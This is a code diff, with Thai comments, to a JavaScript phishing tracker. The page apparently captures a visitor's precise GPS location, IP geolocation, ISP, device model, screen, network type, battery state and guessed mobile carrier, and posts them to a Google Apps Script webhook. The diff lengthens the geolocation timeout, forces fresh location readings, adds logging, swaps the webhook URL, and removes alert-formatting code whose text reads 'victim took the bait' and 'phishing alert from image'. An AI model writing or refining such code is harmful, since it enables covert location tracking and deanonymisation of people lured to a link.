@@ -86,11 +86,12 @@ function getUrlParameters() {
         requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
       };
       
-      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
+      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 15 วินาที (เพิ่มเวลา)
       if (navigator.geolocation) {
         const locationPromise = new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(
             position => {
+              console.log("ได้รับข้อมูลตำแหน่ง:", position.coords); // Log success
               resolve({
                 lat: position.coords.latitude,
                 long: position.coords.longitude,
@@ -99,30 +100,37 @@ function getUrlParameters() {
               });
             },
             error => {
-              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
-              resolve("ไม่มีข้อมูล");
+              // Log error details
+              console.error(`ไม่สามารถเข้าถึงตำแหน่ง: ${error.message} (Code: ${error.code})`);
+              resolve("ไม่มีข้อมูล"); // Resolve with "ไม่มีข้อมูล" on error
             },
             {
-              timeout: 5000,
-              enableHighAccuracy: true
+              timeout: 15000, // เพิ่ม timeout เป็น 15 วินาที
+              enableHighAccuracy: true,
+              maximumAge: 0 // Force fresh location data
             }
           );
         });
         
-        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
+        // รอข้อมูลพิกัดไม่เกิน 15 วินาที
         Promise.race([
           locationPromise,
-          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
+          new Promise(resolve => setTimeout(() => {
+            console.log("Geolocation request timed out after 15 seconds.");
+            resolve("ไม่มีข้อมูล");
+          }, 15000)) // Timeout matches getCurrentPosition
         ])
         .then(location => {
           // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
           dataToSend.location = location;
+          console.log("ข้อมูลที่จะส่ง (รวมพิกัด):", dataToSend); // Log data before sending
           
           // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
           sendToLineNotify(dataToSend);
         });
       } else {
         // ถ้าไม่สามารถใช้ Geolocation API ได้
+        console.log("Geolocation API ไม่รองรับในเบราว์เซอร์นี้");
         dataToSend.location = "ไม่มีข้อมูล";
         sendToLineNotify(dataToSend);
       }
@@ -132,38 +140,7 @@ function getUrlParameters() {
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
-  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
-}
-
-// ฟังก์ชันใหม่เพื่อรองรับการแจ้งเตือนจาก LIFF Image Share
-function processImagePhishingData(data) {
-  // ตรวจสอบว่าเป็นข้อมูลจากรูปภาพ
-  if (data.source === 'liff-image') {
-    // เพิ่ม flag บ่งบอกว่ามาจากรูปภาพ
-    data.isImagePhishing = true;
-    
-    // ปรับแต่งข้อความแจ้งเตือน
-    const originalMessage = createDetailedMessage(
-      data.ipData, data.location, data.timestamp, 
-      data.deviceData, data.phoneInfo, data.trackingKey, data.caseName
-    );
-    
-    // เพิ่มข้อมูลเกี่ยวกับที่มาของการฟิชชิ่ง
-    const enhancedMessage = "[แจ้งเตือนฟิชชิ่งจากรูปภาพ]\n" + originalMessage;
-    
-    // ถ้ามี imageUrl ให้เพิ่มลงในข้อความ
-    if (data.imageUrl) {
-      enhancedMessage += "\n\n🖼️รูปภาพที่ใช้: " + data.imageUrl;
-    }
-    
-    return enhancedMessage;
-  }
-  
-  // ถ้าไม่ใช่ ให้ใช้ฟังก์ชันเดิม
-  return createDetailedMessage(
-    data.ipData, data.location, data.timestamp, 
-    data.deviceData, data.phoneInfo, data.trackingKey, data.caseName
-  );
+  return Date.now().toString(36) + Math.random().toString(36).substr(2);
 }
 
 // ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
@@ -776,125 +753,9 @@ async function estimatePhoneNumber() {
   }
 }
 
-// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
-function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        // เมื่อได้รับพิกัด
-        const lat = position.coords.latitude;
-        const long = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-        const locationData = {
-          lat: lat,
-          long: long,
-          accuracy: accuracy,
-          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
-        };
-
-        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
-        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
-      },
-      function(error) {
-        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
-        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
-      },
-      {
-        timeout: 5000,
-        enableHighAccuracy: true
-      }
-    );
-  }
-}
-
-// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
-function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
-  // ข้อความหลัก
-  const message = [
-    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
-    `⏰เวลา: ${timestamp}`,
-  ];
-  // เพิ่มข้อมูล Case Name (ถ้ามี)
-  if (caseName && caseName !== "ไม่มีค่า") {
-    message.push(`📂ชื่อเคส: ${caseName}`);
-  }
-  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
-  if (trackingKey && trackingKey !== "ไม่มีค่า") {
-    message.push(`🔑Tracking Key: ${trackingKey}`);
-  }
-  // --- ข้อมูล IP ละเอียด ---
-  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
-  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
-    message.push(`   - Hostname: ${ipData.hostname}`);
-  }
-  if (ipData.city && ipData.country) {
-    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
-    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
-  }
-  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
-    message.push(`   - พิกัด (IP): ${ipData.loc}`);
-  }
-  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
-    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
-  }
-  if (ipData.org && ipData.org !== "ไม่ทราบ") {
-    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
-  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
-    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
-  }
-  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
-    message.push(`   - Timezone: ${ipData.timezone}`);
-  }
-  // --- จบข้อมูล IP ---
-
-  // ข้อมูลพิกัด GPS (ถ้ามี)
-  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
-    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
-    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
-  } else {
-    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
-  }
-
-  // ข้อมูลอุปกรณ์
-  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
-  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);
-
-  // ข้อมูลหน้าจอ
-  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);
-
-  // ข้อมูลระบบ
-  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
-  message.push(`🔤ภาษา: ${deviceData.language}`);
-
-  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
-  if (typeof deviceData.connection === 'object') {
-    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
-    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
-    const networkType = deviceData.connection.networkType;
-    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
-    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);
-
-    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
-    if (deviceData.connection.isMobile && phoneInfo) {
-      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
-      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
-        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
-      }
-      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
-    }
-  }
-
-  // ข้อมูลแบตเตอรี่
-  if (typeof deviceData.battery === 'object') {
-    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
-  }
-
-  return message.join("\n");
-}
-
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxklmBbC60cVZHdHAR8KuNbyDe1uVVa-HssltqYBHIKgWs0cURojb7yEQP6M-oqiX9Z/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
